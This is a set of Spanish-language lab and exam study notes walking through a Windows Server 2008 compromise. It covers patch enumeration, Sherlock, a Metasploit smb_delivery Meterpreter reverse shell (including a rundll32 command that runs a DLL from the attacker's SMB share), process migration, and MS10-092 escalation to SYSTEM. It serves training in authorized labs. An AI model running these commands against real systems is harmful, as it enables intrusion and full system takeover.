
## 1. Enumeración de parches instalados

En sistemas Windows Server 2008 es importante comprobar el nivel de parches para identificar posibles vulnerabilidades locales.

### CMD

Mostrar las actualizaciones instaladas:

```cmd
wmic qfe
```

Mostrar información detallada del sistema:

```cmd
systeminfo
```

`wmic qfe` permite consultar los hotfixes instalados. `systeminfo` proporciona información del sistema operativo y del nivel de parches.

### PowerShell: ejecutar Sherlock

Si disponemos del script `Sherlock.ps1`, podemos utilizarlo para buscar vulnerabilidades conocidas.

```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\Sherlock.ps1
Find-AllVulns
```

- `Set-ExecutionPolicy Bypass -Scope Process`: permite ejecutar scripts durante la sesión actual de PowerShell.
- `Import-Module`: carga el script.
- `Find-AllVulns`: busca vulnerabilidades conocidas.

**Nota:** los resultados de Sherlock son indicativos; hay que comprobar la arquitectura, los parches y las condiciones concretas de cada vulnerabilidad.

## 2. Obtener una sesión de Meterpreter con SMB Delivery

En Metasploit:

```text
search smb_delivery
use exploit/windows/smb/smb_delivery
show options
show targets
```

El módulo prepara un recurso SMB desde el que el sistema objetivo puede ejecutar un payload.

### Configurar las opciones

```text
set SRVHOST <IP_VPN_KALI>
set SRVPORT 445
set LHOST <IP_VPN_KALI>
set LPORT 4444
```

- `SRVHOST`: IP local de Kali en la que escuchará el servidor SMB.
- `SRVPORT`: puerto del servidor SMB.
- `LHOST`: IP de Kali a la que se conectará la shell inversa.
- `LPORT`: puerto que recibirá la conexión inversa.

**Importante:** `SRVHOST` debe ser una dirección de la máquina atacante, no la IP de la víctima.

Si el puerto 445 está ocupado, comprueba qué proceso lo utiliza antes de intentar liberar el puerto.

### Seleccionar el objetivo y ejecutar

El módulo dispone de distintos objetivos, entre ellos `DLL` y `PSH`. Elige el que corresponda al procedimiento del laboratorio:

```text
set target 0
exploit
```

Si el módulo genera un comando para ejecutar en el objetivo, ejecútalo únicamente en el entorno autorizado del laboratorio.

Por ejemplo, para el objetivo DLL, el material muestra un comando de esta forma:

```cmd
rundll32.exe \\<IP_VPN_KALI>\<RECURSO>\<ARCHIVO>.dll,0
```

Cuando el payload se ejecute y se conecte a Kali, Metasploit debería abrir una sesión de Meterpreter.

Para listar las sesiones:

```text
sessions -l
```

Para interactuar con una sesión:

```text
sessions -i <ID>
```

## 3. Comprobar la arquitectura de Meterpreter

Una vez dentro de Meterpreter:

```text
sysinfo
getpid
ps
```

- `sysinfo`: muestra información del sistema y la arquitectura de Meterpreter.
- `getpid`: muestra el PID del proceso asociado a la sesión.
- `ps`: lista los procesos, sus PID y, cuando está disponible, su arquitectura.

Ejemplo del laboratorio:

```text
Architecture : x64
Meterpreter  : x86/windows
```

Esto significa que **Windows es de 64 bits, pero el proceso de Meterpreter es de 32 bits**.

No hay que confundir la arquitectura del sistema operativo con la del proceso que aloja Meterpreter.

## 4. Migrar Meterpreter de x86 a x64

### ¿Qué significa migrar?

Migrar consiste en trasladar la sesión de Meterpreter desde el proceso en el que se está ejecutando a otro proceso del sistema.

Si Meterpreter se ejecuta dentro de un proceso x86, puede ser necesario migrarlo a un proceso x64 para utilizar determinadas herramientas o exploits que requieren una sesión de 64 bits.

**La migración no convierte Windows x86 en x64 ni cambia la arquitectura del sistema operativo.** Solo cambia el proceso que aloja la sesión.

### Procedimiento con Meterpreter

**Paso 1.** Consultar el PID actual:

```text
getpid
```

**Paso 2.** Enumerar los procesos:

```text
ps
```

**Paso 3.** Identificar un proceso x64 adecuado y autorizado para la migración.

En el ejemplo del laboratorio aparece `conhost.exe` con arquitectura x64 y PID `2796`. Ese PID es específico de aquella ejecución: en tu sesión puede ser diferente.

**Paso 4.** Migrar al PID elegido:

```text
migrate <PID_X64>
```

Por ejemplo, utilizando el PID del material:

```text
migrate 2796
```

**Paso 5.** Comprobar que la migración se ha completado:

```text
getpid
sysinfo
```

Una migración satisfactoria cambia el proceso que aloja Meterpreter, pero no garantiza por sí sola que el exploit posterior vaya a funcionar.

### ¿Se puede hacer desde CMD o PowerShell?

Los comandos `migrate`, `getpid` y `ps` son comandos de **Meterpreter**, no comandos nativos de CMD o PowerShell.

Desde una shell normal puedes consultar la arquitectura y los procesos:

#### CMD

```cmd
systeminfo
wmic os get osarchitecture
tasklist
```

#### PowerShell

```powershell
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, OSArchitecture
Get-Process | Select-Object Id, ProcessName
```

En sistemas antiguos como Windows Server 2008, algunos cmdlets modernos pueden no estar disponibles. Una alternativa es:

```powershell
Get-WmiObject Win32_OperatingSystem | Select-Object Caption, OSArchitecture
Get-Process | Select-Object Id, ProcessName
```

Estos comandos permiten enumerar el sistema y sus procesos, pero **no migran una sesión de Meterpreter**.

Para realizar la migración descrita en el laboratorio, utiliza `migrate <PID>` desde Meterpreter.

## 5. Escalada de privilegios mediante MS10-092

El material utiliza la vulnerabilidad del Programador de tareas de Windows, conocida como **MS10-092**, asociada a CVE-2010-3338 y CVE-2010-3888.

Primero, desde Metasploit:

```text
background
search 2010-3338
```

Seleccionar el módulo:

```text
use exploit/windows/local/ms10_092_schelevator
show options
```

### Configurar el módulo

Indicar la sesión de Meterpreter:

```text
set SESSION <ID_SESION>
```

Configurar la conexión inversa:

```text
set LHOST <IP_VPN_KALI>
set LPORT 4443
```

Comprobar la configuración:

```text
show options
```

El material identifica como objetivo compatible:

```text
Windows Vista, 7, and 2008
```

### Ejecutar

```text
exploit
```

Si el sistema es vulnerable y se cumplen las condiciones necesarias, el módulo puede conseguir una sesión con privilegios elevados.

Comprobar el usuario de la sesión obtenida:

```text
sessions -l
sessions -i <ID_NUEVO>
getuid
sysinfo
```

El resultado esperado en el ejemplo del laboratorio es:

```text
NT AUTHORITY\SYSTEM
```

**Importante:** que el módulo sea compatible con Windows Server 2008 no significa que todos los equipos con esa versión sean vulnerables. El resultado depende de los parches y de las condiciones específicas del sistema.

## 6. Conceptos clave para el examen

- `wmic qfe`: enumera los parches instalados.
- `systeminfo`: muestra información del sistema operativo.
- `Find-AllVulns`: busca vulnerabilidades conocidas mediante Sherlock.
- `smb_delivery`: prepara un recurso SMB para entregar un payload.
- `SRVHOST`: dirección local en la que escucha el servicio SMB.
- `LHOST`: dirección de Kali para recibir la conexión inversa.
- `sysinfo`: muestra la arquitectura del sistema y de Meterpreter.
- `getpid`: devuelve el PID actual.
- `ps`: enumera procesos y sus arquitecturas cuando la información está disponible.
- `migrate <PID>`: cambia el proceso que aloja Meterpreter.
- Migrar de un proceso x86 a uno x64 **no convierte el sistema operativo de 32 a 64 bits**.
- `MS10-092`: vulnerabilidad histórica del Programador de tareas utilizada en el laboratorio para practicar la escalada de privilegios.
- `getuid`: permite comprobar el usuario de la sesión de Meterpreter.
- `NT AUTHORITY\SYSTEM`: cuenta con privilegios muy elevados en Windows.
